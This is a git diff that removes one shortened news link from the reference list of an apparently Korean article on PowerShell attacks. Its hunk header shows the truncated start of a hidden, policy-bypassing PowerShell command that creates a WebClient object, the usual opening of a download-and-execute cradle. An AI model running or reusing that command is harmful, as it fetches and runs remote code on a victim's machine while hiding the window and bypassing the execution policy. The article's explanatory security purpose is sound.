@@ -94,5 +94,4 @@ cmd.exe /c powershell.exe -w hiddden -nop -ep bypass (New-Object System.Net.WebC
 - [SANS 자료](https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1511980157.pdf)  
 - [Broadcom 보고서](https://docs.broadcom.com/doc/increased-use-of-powershell-in-attacks-16-en)  
 - [AhnLab 기사](https://www.ahnlab.com/kr/site/securityinfo/secunews/secuNewsView.do?seq=25651)  
-- [보안뉴스 보기](https://bit.ly/2V99SLF)
 
